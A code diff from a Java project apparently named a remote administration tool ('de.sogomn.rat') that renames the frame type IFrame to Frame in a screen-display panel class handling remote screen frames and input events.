@@ -15,7 +15,7 @@ import de.sogomn.engine.util.AbstractListenerContainer;
 import de.sogomn.engine.util.ImageUtils;
 import de.sogomn.rat.packet.KeyEventPacket;
 import de.sogomn.rat.packet.MouseEventPacket;
-import de.sogomn.rat.util.FrameEncoder.IFrame;
+import de.sogomn.rat.util.FrameEncoder.Frame;
 
 public final class DisplayPanel extends AbstractListenerContainer<IGuiController> implements IMouseListener, IKeyboardListener {
 	
@@ -149,16 +149,16 @@ public final class DisplayPanel extends AbstractListenerContainer<IGuiController
 		updateScreen(width, height);
 	}
 	
-	public void showFrame(final IFrame frame, final int screenWidth, final int screenHeight) {
+	public void showFrame(final Frame frame, final int screenWidth, final int screenHeight) {
 		updateImage(screenWidth, screenHeight);
 		drawToScreenImage(frame.image, frame.x, frame.y);
 		updateScreen(screenWidth, screenHeight);
 	}
 	
-	public void showFrames(final IFrame[] frames, final int screenWidth, final int screenHeight) {
+	public void showFrames(final Frame[] frames, final int screenWidth, final int screenHeight) {
 		updateImage(screenWidth, screenHeight);
 		
-		for (final IFrame frame : frames) {
+		for (final Frame frame : frames) {
 			drawToScreenImage(frame.image, frame.x, frame.y);
 		}
 		
